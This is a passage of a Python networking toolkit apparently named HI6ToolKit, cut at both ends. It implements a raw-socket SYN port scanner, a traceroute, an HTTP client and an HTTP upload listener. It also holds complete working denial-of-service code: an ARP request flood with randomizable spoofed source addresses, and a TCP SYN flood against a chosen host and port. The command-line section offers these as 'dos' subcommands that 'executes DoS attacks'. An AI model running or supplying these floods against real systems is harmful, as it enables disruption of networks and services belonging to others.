                    scan.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    scan.settimeout(self.timeout)
                    scan.setblocking(False)
                    await self.loop.sock_sendto(scan, payload[0], (self.host, port))
                    while True :
                        rsp = await self.loop.sock_recv(scan, 1024)
                        if self.check_acknum(payload[1], rsp[20:]) :
                            return (True, rsp)
        except asyncio.TimeoutError :
            return (False, None)
        except socket.timeout :
            return (False, None)

    async def scan(self, port : int) -> tuple[bool, bool] :
        return await self.__scan(port)

    async def __scan(self, port : int) -> tuple[bool, bool] :
        status, response = await self.send(port)
        if status :
            tcp_header = response[20:]
            is_open = self.is_open_port(tcp_header)
            if is_open :
                self.opens.append(port)
                return (True, True)
            else :
                return (False, True)
        else :
            self.unspecified.append(port)
            return (False, False)


class Trace :
    def __init__(self, host : str, efforts : int, timeout : float, max_error : int) -> None :
        self.host = host
        self._efforts = self.efforts = efforts
        self.timeout = timeout
        self.max_frequent_errors = max_error
        self.source = Constant.SOURCE()
        self.last_hop_ipaddr = (str(), int())
        self.current_ttl = Constant.COUNTER(1)
        self._port = self.port = Constant.COUNTER(33434)
        self.hops = dict()
        self.frequent_error = int()
        self.stop = False
        self.status = True
        self.key_data = b"HI6Toolkit_Trace"
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Sniff : \n\t{self.host}"

    @property
    def efforts(self) -> int :
        return self._efforts

    @efforts.setter
    def efforts(self, value : int) -> None :
        if (value >= 0) and (value <= 5) :
            self._efforts = value
        else :
            raise Exception("efforts should be in range (1, 5)")
        return

    @property
    def port(self) -> int :
        return self._port.value

    @port.setter
    def port(self, value : int) -> None :
        self._port.value += 1
        return self._port.value - 1

    @staticmethod
    def ip_header(src : str, dst : str, tln : int = 20, idn : int = 0, ttl : int = 40, csm : int = 0) -> bytes :
        return DoS_SYN.ip_header(src = src, dst = dst, tln = tln, idn = idn, ttl = ttl, prt = socket.IPPROTO_UDP, csm = csm)

    @staticmethod
    def udp_header(src : int, dst : int, tln : int = 0, csm : int = 0) -> bytes :
        return struct.pack("!HHHH", src, dst, tln, csm)

    @staticmethod
    def pseudo_header(src : str, dst : str, pln : int) -> bytes :
        return DoS_SYN.pseudo_header(src = src, dst = dst, prt = socket.IPPROTO_UDP, pln = pln)

    @staticmethod
    def icmp_type_code(data : bytes) -> tuple[int, int] :
        type = bytes(data[:8]).hex()
        code = bytes(data[8:16]).hex()
        return (type, code)

    @staticmethod
    def timer(func : "func") -> tuple[float, tuple[bool, memoryview, memoryview, tuple[str, int]]] :
        def timer(self) -> tuple[float, "func"] :
            start_time = time.time()
            result = func(self)
            return ((time.time() - start_time), result)
        return timer

    @staticmethod
    def get_hostname(ipaddr : tuple[str, int]) -> str :
        try : host = socket.getnameinfo(ipaddr, 0)[0]
        except : return "*.*.*.*"
        else : return host if (host != ipaddr[0]) else "*.*.*.*"

    @staticmethod
    def milisec(time : int) -> str :
        return str(round(time * 1000, 3)) + "ms"

    @staticmethod
    def average_time(times : list) -> int :
        if not times : return 0.0
        for i in range(1, len(times)) : times[i] *= 2
        else : return (sum(times) / ((len(times) - 1) * 2 + 1))

    @staticmethod
    def check_last_effort(effort : int) -> bool :
        return True if (effort - 1 == 0) else False

    @staticmethod
    def check_icmp_dst_unreachable(payload : memoryview | bytes) -> bool :
        istype = payload[0] == 3
        return istype

    @staticmethod
    def check_icmp_time_exceeded(payload : memoryview | bytes) -> bool :
        istype = payload[0] == 11
        iscode = payload[1] == 0
        return istype and iscode

    @staticmethod
    def get_ip_identification(payload : memoryview | bytes) -> int :
        value = payload[4:6]
        idn = (value[0] << 8) + value[1]
        return idn

    @staticmethod
    def get_ip_checksum(payload : memoryview | bytes) -> int :
        value = payload[10:12]
        csm = (value[0] << 8) + value[1]
        return csm

    @staticmethod
    def get_udp_csm(payload : memoryview | bytes) -> int :
        value = payload[6:8]
        csm = (value[0] << 8) + value[1]
        return csm

    @timer
    def fetch(self) -> tuple[bool, memoryview, memoryview, tuple[str, int]] :
        udp_payload = self.send(self.source, self.host, self.current_ttl.value)
        status, response, ipaddr = self.recv(udp_payload)
        return (status, udp_payload, response, ipaddr)

    def prepare(self, src : str, dst : str, src_p : int, dst_p : int, ttl : int, data : bytes) -> bytes :
        randnum : int = lambda x, y : random.randint(x, y)
        randidn = randnum(0, 0xffff)
        data_length = len(data)
        src = socket.inet_pton(socket.AF_INET, src)
        dst = socket.inet_pton(socket.AF_INET, dst)
        ip_header = self.ip_header(src = src, dst = dst, tln = data_length + 28, idn = randidn, ttl = ttl)
        ip_header_csm = DoS_SYN.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, tln = data_length + 28, idn = randidn, ttl = ttl, csm = ip_header_csm)
        udp_header = self.udp_header(src = src_p, dst = dst_p, tln = data_length + 8)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(udp_header) + data_length)
        udp_header_csm = DoS_SYN.checksum(udp_header + data + pseudo_header)
        udp_header = self.udp_header(src = src_p, dst = dst_p, tln = data_length + 8, csm = udp_header_csm)
        return ip_header + udp_header + data

    def check_time_exceeded_response(self, payload : memoryview | bytes, resp_payload : memoryview | bytes) -> bool :
        key_payload = payload[:28]
        resp_key_payload = resp_payload[8:36]
        nonce = 0
        ip_idn = self.get_ip_identification(key_payload[:20])
        ip_csm = self.get_ip_checksum(key_payload[:20])
        origin_udp_csm = self.get_udp_csm(key_payload[20:])
        resp_ip_idn = self.get_ip_identification(resp_key_payload[:20])
        resp_ip_csm = self.get_ip_checksum(resp_key_payload[:20])
        resp_origin_udp_csm = self.get_udp_csm(resp_key_payload[20:])
        if self.check_icmp_time_exceeded(resp_payload[:8]) : nonce += 1
        if (ip_idn == resp_ip_idn) : nonce += 1
        if (ip_csm == resp_ip_csm) : nonce += 1
        if (origin_udp_csm == resp_origin_udp_csm) : nonce += 1
        return True if (nonce > 1) else False

    def check_overshoot_error(self) -> bool :
        if (self.frequent_error >= self.max_frequent_errors) :
            self.status = False
            return True
        else : return False

    def send(self, src : str, dst : str, ttl : int) -> memoryview :
        key_data = self.key_data
        rand_src_p, rand_dst_p = random.randint(1024, 0xffff), self.port
        payload = self.prepare(src, dst, rand_src_p, rand_dst_p, ttl = ttl, data = key_data)
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as trace :
            trace.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            trace.sendto(payload, (dst, rand_dst_p))
        return memoryview(payload)

    def recv(self, key_payload : bytes) -> tuple[bool, memoryview, tuple[str, int]] :
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as trace :
            trace.settimeout(self.timeout)
            try :
                response = trace.recvfrom(len(key_payload) + 28)
                payload  = memoryview(response[0])
                ipaddr = response[1]
            except socket.timeout :
                return (False, bytes(), (str(), int()))
            else :
                return (True, payload, ipaddr)

    def __log(self) -> None :
        log = str()
        ttl = self.current_ttl.value
        ipaddr = self.hops[ttl][0][0]
        hostname = self.hops[ttl][1]
        average_time = self.hops[ttl][2]
        times = self.hops[ttl][3]
        log += "[" + Constant.GREEN("TTL") + " : " + str(ttl) + "]" + Constant.RED(" --> ")
        log += ipaddr + " " + hostname
        log += "\n\t"
        log += " ".join([self.milisec(time) for time in times])
        log += " " + Constant.YELLOW("AVG") + ":" + self.milisec(average_time) + "\n"
        print(log)
        return

    def __log_fail(self) -> None :
        log_fail = str()
        log_fail += "[" + Constant.RED("FAILED") + "]" + " : "
        log_fail += f"reached the max_frequent_errors({self.max_frequent_errors})"
        print(log_fail)
        return

    def trace(self) -> None :
        while (not self.stop) and (not self.check_overshoot_error()) :
            self.__trace()
            self.__log()
            self.current_ttl.value += 1
        if not self.status : self.__log_fail()
        return

    def __trace(self) -> None :
        times = list()
        efforts = self.efforts
        while (efforts > 0) :
            time, result = self.fetch()
            status, udp_payload, response, ipaddr = result
            if status :
                self.frequent_error = 0
                times.append(time)
                if self.check_icmp_dst_unreachable(response[20:28]) :
                    if self.check_last_effort(efforts) : self.stop = True
                elif not self.check_time_exceeded_response(udp_payload, response[20:]) : times.pop()
            else : self.frequent_error += 1
            self.last_hop_ipaddr = ipaddr
            efforts -= 1
        self.hops[self.current_ttl.value] = [
            self.last_hop_ipaddr,
            self.get_hostname(self.last_hop_ipaddr),
            self.average_time(times),
            times
            ]
        return


class DoS_Arp :
    def __init__(self, iface : str, source : str, gateway : str, srcmac : str, number : int, wait : float) -> None :
        self._iface = self.iface = iface
        self._source = self.source = source
        self.gateway = gateway
        self.srcmac = srcmac
        self.num = number
        self.wait = wait
        self._count = Constant.COUNTER(0)
        self.dstmac = "ff:ff:ff:ff:ff:ff"
        self.hattype = 1
        self.ethernet = self.ethernet_header(
            dst = self.dstmac,
            src = self.srcmac,
            typ = 0x0806
            )
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"DoS_Arp : \n\t{self.iface}\n\t{self.srcmac}\n\t{self.source}"

    @property
    def iface(self) -> str :
        return self._iface

    @iface.setter
    def iface(self, value : str) -> None :
        ifaces = Constant.IFACES
        if (self._iface not in ifaces) :
            raise OSError(f"{self.iface} not in {ifaces}")
        else : self._iface = value
        return

    @property
    def source(self) -> str :
        randnum = lambda : random.randint(0, 255)
        ip = ".".join([str(randnum()) if (part == "*") else part for part in self._source.split(".")])
        return ip

    @source.setter
    def source(self, value : str) -> None :
        self._source = value
        return

    @property
    def srcmac(self) -> bytes :
        return self._srcmac

    @srcmac.setter
    def srcmac(self, value : str) -> None :
        self._srcmac = binascii.unhexlify(value.replace(":", ""))
        return

    @property
    def dstmac(self) -> bytes :
        return self._dstmac

    @dstmac.setter
    def dstmac(self, value : str) -> None :
        self._dstmac = binascii.unhexlify(value.replace(":", ""))
        return

    @property
    def count(self) -> int :
        return self._count.value

    @count.setter
    def count(self, value : int) -> None :
        if (self._count.value > 0xffff) and (self.num == -1) :
            self._count.value = 0
            self._count.value = value - 0xffff
        else : self._count.value = value
        return

    @staticmethod
    def ethernet_header(dst : str, src : str, typ : int) -> bytes :
        return struct.pack("!6s6sH", dst, src, typ)

    @staticmethod
    def arp_header(htp : int, ptp : int, hln : int, pln : int, opt : int, sha : str, spa : str, tha : str, tpa : str) -> bytes :
        spa = socket.inet_pton(socket.AF_INET, spa)
        tpa = socket.inet_pton(socket.AF_INET, tpa)
        return struct.pack("!HHBBH6s4s6s4s", htp, ptp, hln, pln, opt, sha, spa, tha, tpa)

    @staticmethod
    def progress_bar(load_bar : str, x : int, y : int, /) -> None :
        text = "[" + Constant.GREEN("+") + "]" + " " + f"{load_bar(x, y)}" + " " + f"[{x}/{y}]"
        print(text, end = "\r", flush = True)
        return

    @staticmethod
    def load_bar(x : int, y : int, /) -> str :
        symbol = Constant.SLASH
        if (y < 32) : return 32 * symbol if (x == y) else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    def check_eth_p_all(self) -> None :
        if ("ETH_P_ALL" not in socket.__all__) :
            socket.ETH_P_ALL = 3
        return

    def prepare(self) -> bytes :
        eth = self.ethernet
        arp = self.arp_header(
            htp = self.hattype,
            ptp = 0x0800,
            hln = 6,
            pln = 4,
            opt = 1,
            sha = self.srcmac,
            spa = self.source,
            tha = self.dstmac,
            tpa = self.gateway
            )
        return eth + arp

    def flood(self) -> None :
        self.check_eth_p_all()
        self.__flood()
        return

    def __flood(self) -> None :
        addr = (
            self.iface,
            socket.ETH_P_ALL,
            socket.PACKET_HOST,
            self.hattype,
            self.dstmac
            )
        print("preparing AF_PACKET socket... ", end = str(), flush = True)
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as flood :
            flood.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
            print(Constant.GREEN("DONE"))
            print("flooding started...")
            while (self.count != self.num) :
                payload = self.prepare()
                flood.sendto(payload, addr)
                self.count += 1
                if (self.num != -1) : self.progress_bar(self.load_bar, self.count, self.num)
                time.sleep(self.wait)
            else :
                end_time = round((time.time() - Constant.TIME()), 2)
                print("\n[" + Constant.GREEN("+") + "]" + " " + "ARP Requests datagrams have been sent")
                print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
        return


class DoS_SYN :
    def __init__(self, host : str, port : int, count : int, rand_port : bool) -> None :
        self.host = host
        self._port = self.port = port
        self.count = count
        self.rand_port = rand_port
        self.source = Constant.SOURCE()
        self.__counter = Constant.COUNTER(0)
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"

    @property
    def port(self) -> int :
        return self._port if not self.rand_port else random.randint(0, 0xffff)

    @port.setter
    def port(self, value : int) -> None :
        self._port = value
        return

    @property
    def counter(self) -> int :
        return self.__counter.value

    @counter.setter
    def counter(self, value : int) -> None :
        self.__counter.value = value
        return

    @staticmethod
    def ip_header(src : str, dst : str,
        ver : int = 4, ihl : int = 5,
        tos : int = 0, tln : int = 40,
        idn : int = 0, flg : int = 0,
        oft : int = 0, ttl : int = 255,
        prt : int = socket.IPPROTO_TCP, csm : int = 0) -> bytes :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn, flg_oft, ttl, prt, csm, src, dst)
        return datagram

    @staticmethod
    def tcp_header(src_p : int = 0, dst_p : int = 0,
        seq : int = 0, acn : int = 0,
        oft : int = 5, urg : int = 0,
        ack : int = 0, psh : int = 0,
        rst : int = 0, syn : int = 0,
        fin : int = 0, win : int = 0xffff,
        csm : int = 0, urp : int = 0) -> bytes :
        oft <<= 12
        res = 0 << 6
        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        oft_res_flg = oft + res + flg
        segment = struct.pack("!HHLLHHHH", src_p, dst_p, seq, acn, oft_res_flg, win, csm, urp)
        return segment

    @staticmethod
    def pseudo_header(src : str, dst : str,
        res : int = 0, prt : int = socket.IPPROTO_TCP,
        pln : int = 0) -> bytes :
        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
        return segment

    @staticmethod
    def checksum(data : bytes) -> int :
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = (~ checksum) & 0xffff
        return checksum

    @staticmethod
    def random_ip() -> str :
        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    @staticmethod
    def progress_bar(x : int, y : int, /) -> str :
        symbol = Constant.SLASH
        if (y < 32) : return 32 * symbol if (x == y) else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    def package(self) -> bytes :
        randip = self.random_ip()
        randnum = lambda x, y : random.randint(x, y)
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = randnum(0, 0xffff)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
        randseq = randnum(0, 0xffff)
        randsrp = randnum(1024, 0xffff)
        port = self.port
        tcp_header = self.tcp_header(src_p = randsrp, dst_p = port, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(src_p = randsrp, dst_p = port, seq = randseq, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self) -> None :
        self.__flood()
        return

    def __flood(self) -> None :
        while (self.counter != self.count) :
            payload = self.package()
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                flood.connect((self.host, self.port))
                flood.sendto(payload, (self.host, self.port))
                flood.shutdown(socket.SHUT_RDWR)
            self.counter += 1
            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.counter, self.count)}" + " " + f"[{self.counter}/{self.count}]"
            print(text, end = "\r", flush = True)
        else :
            end_time = round((time.time() - Constant.TIME()), 2)
            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have been sent")
            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
        return


class HTTP_Request :
    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool) -> None :
        self.host = host
        self.port = int(port)
        self.method = method if (method in ("GET", "HEAD")) else "GET"
        self.header = header
        self.end = end if end else "/"
        self.https = bool(https)
        self.request_header = str()
        self.response = bytes()
        self.response_header = str()
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"

    def prepare(self) -> str :
        if self.header : return self.header
        payload = [
            f"{self.method} {self.end} HTTP/1.1",
            f"Host: {self.host}",
            "User-Agent: HI6ToolKit",
            "Accept: */*",
            "Connection: close",
            "\r\n"
            ]
        return "\r\n".join(payload)

    def parse_response_header(self, response : bytes) -> tuple[str, bytes] :
        response = response.split(b"\r\n\r\n", 1)
        self.response_header = response[0].decode()
        self.response = response[1]
        return self.response_header, self.response

    def request(self) -> None :
        self.__request()
        return

    def __request(self) -> None :
        if self.https : sslcontext = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
            http.settimeout(30)
            http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
            self.request_header = self.prepare()
            if not Constant.MODULE : print(self.request_header)
            http.connect((self.host, self.port))
            http.send(self.request_header.encode())
            raw_data = bytes()
            while True :
                response = http.recv(1024)
                if not response :
                    header, data = self.parse_response_header(raw_data)
                    if not Constant.MODULE :
                        print(header, end = "\n\n")
                        print(data)
                    if self.https : http.close()
                    break
                else :
                    raw_data += response
        return


class Tunnel :
    def __init__(self, host : str, port : int, timeout : float, buffer : int) -> None :
        self.host = host
        self.port = port
        self.timeout = timeout
        self.buffer = buffer
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Tunnel : \n\t{self.host}\n\t{self.port}"

    @staticmethod
    def open_file(name : str) -> "file" :
        path = f"./{name}"
        mode = "ab" if os.path.exists(path) else "wb"
        file = open(path, mode)
        Constant.FILES.append(file)
        return file

    @staticmethod
    def tmp_file(file : "open", data : bytes) -> None :
        file.write(data)
        return

    @staticmethod
    def parse_headers(data : bytes) -> dict :
        headers = {header.split(": ", 1)[0] : header.split(": ", 1)[-1] for header in data.split("\r\n")[1:-1]}
        headers["status"] = data.split("\r\n", 1)[0].split(" ")[0]
        headers["name"] = data.split("\r\n", 1)[0].split(" ")[1][1:]
        headers["version"] = data.split("\r\n", 1)[0].split(" ")[-1]
        return headers

    @staticmethod
    def get_name(headers : dict) -> str :
        keyword = "name"
        if (keyword in headers) and (headers[keyword]) :
            return headers[keyword] + f"_{Constant.TIME()}"  + ".tmp"
        else : return f"new_{Constant.TIME()}.tmp"

    @staticmethod
    def get_length(headers : dict) -> int :
        keyword = "Content-Length"
        if (keyword in headers) :
            return int(headers[keyword])
        else : return 0

    @staticmethod
    def get_status(headers : dict) -> str | None :
        keyword = "status"
        if (keyword in headers) :
            return headers[keyword]
        else :
            raise Exception("couldn't find status")
            return

    @staticmethod
    def get_version(headers : dict) -> str :
        keyword = "version"
        if (keyword in headers) :
            return headers[keyword]
        else : return "HTTP/1.0"

    @staticmethod
    def get_parts(length : int, buffer : int) -> tuple[int, int] :
        if (buffer > length) : return (length, 0)
        npart = length // buffer
        nrimd = length % buffer
        return (nrimd, npart)

    @staticmethod
    def readline(sock : socket.socket) -> bytes :
        line = bytes()
        while (not line.endswith(b"\r\n")) :
            line += sock.recv(1)
        else : return line

    @staticmethod
    def readbuffer(sock : socket.socket, buffer : int) -> bytes :
        data = bytes()
        while (len(data) != buffer) :
            data += sock.recv(buffer - len(data))
        else : return data

    @staticmethod
    def write(sock : socket.socket, data : bytes) -> None :
        data = data if isinstance(data, bytes) else data.encode()
        sock.sendall(data)
        return

    @staticmethod
    def prepare_response(version : str, success : bool) -> str :
        if success :
            payload = [
            f"{version} 200 OK",
            "User-Agent: HI6ToolKit",
            "\r\n"
            ]
        else :
            payload = [
                f"{version} 400 Bad Request",
                "User-Agent: HI6ToolKit",
                "\r\n"
                ]
        payload = "\r\n".join(payload).encode()
        return payload

    @staticmethod
    def progress_bar(x : int, y : int) -> str :
        symbol = Constant.SLASH
        if (y < 32) : return 32 * symbol if (x == y) else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    @staticmethod
    def percent(x : int, y : int) -> int :
        return round((x / y) * 100)

    def init_server(self) -> None :
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(self.timeout)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        return

    def get_header(self, sock : socket.socket) -> str :
        header = bytes()
        while (not header.endswith(b"\r\n\r\n")) :
            header += self.readline(sock)
        else : return header.decode()

    def tunnel(self) -> None :
        self.__tunnel()
        return

    def __tunnel(self) -> None :
        print("[" + Constant.GREEN("+") + "]" + " " + "run init_server()", end = "  ", flush = True)
        self.init_server()
        print(Constant.GREEN("DONE"))
        print("[" + Constant.GREEN("+") + "]" + " " + "run socket.accept()")
        conn, addr = self.sock.accept()
        print("[" + Constant.GREEN("+") + "]" + " " + f"new connection from {addr[0]}:{addr[-1]}")
        headers = self.parse_headers(self.get_header(conn))
        print("[" + Constant.GREEN("+") + "]" + " " + "parsing header", end = "  ", flush = True)
        status, name, version, length = self.get_status(headers), self.get_name(headers), self.get_version(headers), self.get_length(headers)
        print(Constant.GREEN("DONE"))
        if not length :
            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, False)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
            Constant.EXIT(1)
        send_length = 0
        tail, parts = self.get_parts(length, self.buffer)
        file = self.open_file(name)
        OUTPUT : str = lambda x, y : "[" + Constant.GREEN("*") + "]" + " " + self.progress_bar(x, y) + " " + f"[{self.percent(x, y)}%]" + f"[{x}/{y}]"
        while (parts != 0) :
            data = self.readbuffer(conn, self.buffer)
            self.tmp_file(file, data)
            send_length += self.buffer
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            parts -= 1
        else :
            data = self.readbuffer(conn, tail)
            self.tmp_file(file, data)
            file.close()
            send_length += tail
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            print("\n[" + Constant.GREEN("+") + "]" + " " + f"sending OK to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, True)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
        return


if not Constant.MODULE :
    def manage_args() -> argparse.Namespace :
        global Sniff_args, DoS_SYN_args, HTTP_Request_args, Tunnel_args
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
        subparser = parser.add_subparsers(title = "tools")
        info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
        info_tool.add_argument("-m", "--msg", type = str, help = "appends message to info", default = "HI6ToolKit")
        info_tool.set_defaults(func = info_args)
        sniff_tool = subparser.add_parser("sniff", help = "executes packet sniffer")
        sniff_tool.add_argument("-if", "--iface", type = str, required = True, help = "sniffs on specific interface", metavar = Constant.IFACES)
        sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr")
        sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr")
        sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "enables storing sniffed packets in file", default = False)
        sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.SO_RCVBUF size", metavar = "socket.SO_RCVBUF", default = 128 * 1024)
        sniff_tool.add_argument("-w", "--wait", type = float, help = "sets asyncio.sleep(wait) less for more traffic to avoid packet loss", default = 0.001)
        sniff_tool.add_argument("-v", "--verboss", action = "store_true", help = "sets verbosity of parsed packets", default = False)
        sniff_tool.set_defaults(func = Sniff_args)
        scan_tool = subparser.add_parser("scan", help = "executes SYN port scanner")
        scan_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host addr for scanning")
        scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning with format X-Y", metavar = "X-Y", default = "0-65535")
        scan_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered syn segments", default = 5.0)
        scan_tool.set_defaults(func = Scan_args)
        trace_tool = subparser.add_parser("trace", help = "executes traceroute")
        trace_tool.add_argument("-x", "--host", type = str, required = True, help = "sets hsot addr for tracing")
        trace_tool.add_argument("-e", "--efforts", type = int, help = "sets number of efforts for each hop", default = 3)
        trace_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered udp segments", default = 1.0)
        trace_tool.add_argument("-m", "--max-error", type = int, help = "sets maximum number of unanswered udp segments", default = 10)
        trace_tool.set_defaults(func = Trace_args)
        dos_tool = subparser.add_parser("dos", help = "executes DoS attacks")
        dos_subparser = dos_tool.add_subparsers()
        arp_tool = dos_subparser.add_parser("arp", help = "executes ARP Request flood")
        arp_tool.add_argument("-if", "--iface", type = str, required = True, help = "specifies network interface", metavar = Constant.IFACES)
        arp_tool.add_argument("-g", "--gateway", type = str, required = True, help = "gateway ip address to flood")
        arp_tool.add_argument("-s", "--source", type = str, required = True, help = "ip can be specific like 192.168.1.1 or can be range like 192.168.*.*") 
        arp_tool.add_argument("-sm", "--src-mac", type = str, required = True, help = "source MAC address of desired iface")
        arp_tool.add_argument("-n", "--number", type = int, help = "sets number of datagrams and must be 32 bit", default = -1)
        arp_tool.add_argument("-w", "--wait", type = float, help = "sets time.sleep after each datagram", default = 0.0)
        arp_tool.set_defaults(func = DoS_Arp_args)
        syn_tool = dos_subparser.add_parser("syn", help = "executes TCP SYN flood")
        syn_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for flooding")
        syn_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
        syn_tool.add_argument("-n", "--number", type = int, required = True, help = "sets number of packets")
        syn_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
        syn_tool.set_defaults(func = DoS_SYN_args)
        http_tool = subparser.add_parser("http", help = "execute http request")
        http_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for http request")
        http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
        http_tool.add_argument("-m", "--method", type = str, help = "sets request type", metavar = ["GET", "HEAD"], default = "GET")
        http_tool.add_argument("-c", "--custom", type = str, help = "sets custome header for HTTP_Request", default = str())
        http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
        http_tool.add_argument("-s", "--secure", action = "store_true", help = "enables secure socket(ssl)", default = False)
        http_tool.set_defaults(func = HTTP_Request_args)
        tunnel_tool = subparser.add_parser("tunnel", help = "execute http tunnel listener")
        tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
        tunnel_tool.add_argument("-p", "--port", type = int, help = "sets port", default = "80")
        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets socket.recv buffer", default = 2048)
        tunnel_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout", default = 60.0)
        tunnel_tool.set_defaults(func = Tunnel_args)
        args = parser.parse_args()
        return args

    def info_args(args : argparse.Namespace) -> None :
        info = f"\t[{args.msg}]\n\t"
        info += "\n\t".join(Constant.INFO)
        info += "\n"
        print(Constant.RED(info.expandtabs(4)))
        return

    def Sniff_args(args : argparse.Namespace) -> None :
        args.msg = "Sniff"
        if not Constant.ISROOT : root_access_error()
        trigger(args)
        sniff = Sniff(
            args.iface,
            args.tmp,
            args.saddr,
            args.daddr,
            args.buffer,
            args.wait,
            args.verboss
            )
        asyncio.run(sniff.sniff())
        return

    def Scan_args(args : argparse.Namespace) -> None :
        args.msg = "Scan"
        split_port_range : tuple = lambda x : tuple([int(i) for i in x.split("-")])
        port_range = split_port_range(args.port_range)
        if not Constant.ISROOT : root_access_error()
        trigger(args)

        async def wait_to_empty(n : int, buffer : set | list) -> None :
            while (len(buffer) >= n) :
                print("[" + Constant.RED("WAIT") + "]", end = " ")
                print(f"buffer is full, {n} requests been sent, awaiting to empty buffer")
                await asyncio.sleep(1)
            return

        async def prepare() -> None :
            print("[" + Constant.GREEN("START") + "]", end = " ")
            print("set async event loop")
            loop = asyncio.get_event_loop()
            scan = Scan(
                socket.gethostbyname(args.host),
                args.timeout,
                loop
                )
            buffer = set()
            for port in range(port_range[0], port_range[1] + 1) :
                if (len(buffer) >= 100) :
                    await wait_to_empty(100, buffer)
                if (port % 100 == 0) and (port != 0) :
                    await asyncio.gather(*buffer)
                task = loop.create_task(scan.scan(port))
                buffer.add(task)
                task.add_done_callback(buffer.discard)
            else :
                if buffer :
                    await asyncio.gather(*buffer)
                if len(scan.opens) :
                    print(f"\nopen ports({len(scan.opens)}) :\n\t", end = str())
